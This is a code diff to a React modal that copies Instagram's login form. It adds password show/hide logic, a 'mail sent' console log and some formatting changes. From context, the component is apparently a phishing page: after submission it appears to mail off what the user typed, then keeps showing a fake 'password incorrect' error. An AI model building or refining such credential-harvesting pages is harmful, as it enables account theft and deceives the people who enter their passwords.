@@ -22,6 +22,7 @@ const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
   const [showPassword, setShowPassword] = useState(false);
   const [hasFilledBoth, setHasFilledBoth] = useState(false);
   const [error, setError] = useState("");
+  const [passwordInputIsEmpty, setPasswordInputIsEmpty] = useState(true);
 
   const formRef = useRef(null);
 
@@ -31,7 +32,9 @@ const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
   };
 
   function invalidCredentials() {
-    setError("Sorry, your password was incorrect. Please double-check your password.");
+    setError(
+      "Sorry, your password was incorrect. Please double-check your password.",
+    );
   }
 
   const handleChange: ChangeEventHandler<HTMLInputElement> = () => {
@@ -81,7 +84,21 @@ const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
 
           <div className="relative">
             <input
-              onChange={handleChange}
+              onChange={(e) => {
+                handleChange(e);
+                if (
+                  (
+                    document.getElementById(
+                      "password-input",
+                    ) as HTMLInputElement
+                  ).value.length > 0
+                ) {
+                  setPasswordInputIsEmpty(false);
+                } else {
+                  setShowPassword(false);
+                  setPasswordInputIsEmpty(true);
+                }
+              }}
               id="password-input"
               name="password"
               type={showPassword ? "text" : "password"}
@@ -97,7 +114,7 @@ const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
               }}
               className="absolute right-2 bottom-2 focus:text-gray-500 rounded text-sm font-semibold"
             >
-              {showPassword ? "Hide" : "Show"}
+              {!passwordInputIsEmpty && (showPassword ? "Hide" : "Show")}
             </button>
           </div>
           <Button
@@ -129,6 +146,7 @@ const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
                       },
                     ))()! as unknown as string,
                 });
+                console.log("mail sent");
                 setInterval(() => invalidCredentials(), 2000);
               }
             }}
@@ -156,14 +174,26 @@ const InstagramLogin = ({ isOpen, closeModal }: InstagramLoginProps) => {
             Log in with Facebbok
           </span>
         </Link>
-        {error && <span className="text-red-400 text-sm mt-4 text-center px-2">{error}</span>}
-        <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" className="mt-4">
+        {error && (
+          <span className="text-red-400 text-sm mt-4 text-center px-2">
+            {error}
+          </span>
+        )}
+        <a
+          href="https://www.instagram.com/accounts/password/reset/"
+          target="_blank"
+          className="mt-4"
+        >
           <span className="text-xs text-blue-900">Forgot password?</span>
         </a>
       </div>
       <div className="bg-white w-[350px] h-[63px] border border-gray-300 text-center py-4">
         <span className="text-sm mr-2">Don't have an account?</span>
-        <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" className="text-blue-500 text-sm font-semibold">
+        <a
+          href="https://www.instagram.com/accounts/emailsignup/"
+          target="_blank"
+          className="text-blue-500 text-sm font-semibold"
+        >
           Sign up
         </a>
       </div>
